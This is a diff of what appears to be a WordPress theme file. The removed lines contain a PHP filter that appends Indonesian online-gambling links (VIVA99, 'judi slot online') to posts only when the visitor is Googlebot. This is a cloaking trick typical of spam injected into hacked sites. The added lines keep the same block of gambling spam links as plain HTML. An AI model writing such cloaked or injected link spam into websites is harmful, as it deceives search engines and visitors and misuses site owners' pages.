@@ -1,8 +1,5 @@
-function bfa_append_to_post($post_body_content) {
-if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']),"googlebot")){
-$post_body_content = $post_body_content . 
-'<style>.center{margin:auto;width:50%;border:3px solid #000;padding:10px}.sitez{text-align:center;font-style:normal;text-decoration:none;font-weight:400;font-size:20px;color:#000}.sitez a{color:#eb4034}.sitez h1{font-family:helvetica;font-size:3vw;letter-spacing:5px;text-align:center;text-transform:uppercase}.sitez p{font-family:calibri;font-size:1.5vw;line-height:2vw;text-align:justify}</style>
-<div class="sitez center">
+<style>.sitez a{color:#eb4034}.sitez h1{font-family:helvetica;font-size:3vw;letter-spacing:5px;text-align:center;text-transform:uppercase}.sitez p{font-family:calibri;font-size:1.5vw;line-height:2vw;text-align:justify}</style>
+<div class="sitez">
 <h1>Our Partners links :</h1>
 <p><b>1.</b> VIVA99 merupakan salah satu Situs <a href="https://www.governorbarbour.com/">Judi Online</a> Terpercaya di Asia yang banyak memberikan bonus</p>
 
@@ -36,8 +33,4 @@ $post_body_content = $post_body_content .
 
 <p><b>16.</b> Slot online paling lengkap hanya ada di <a href='https://www.governorbarbour.com/'>situs slot online</a> ini, member dapat bermain dengan nyaman tanpa hambatan</p>
 
-<p><b>17.</b> VIVA99 Memiliki Pelayanan <a href="https://www.womensmarchlondon.com/">judi slot online</a> , member dapat bermain dengan nyaman tanpa hambatan.</p>';
-return $post_body_content;
-  }
-}
-add_filter('the_content', 'bfa_append_to_post');
+<p><b>17.</b> VIVA99 Memiliki Pelayanan <a href="https://www.womensmarchlondon.com/">judi slot online</a> , member dapat bermain dengan nyaman tanpa hambatan.</p>
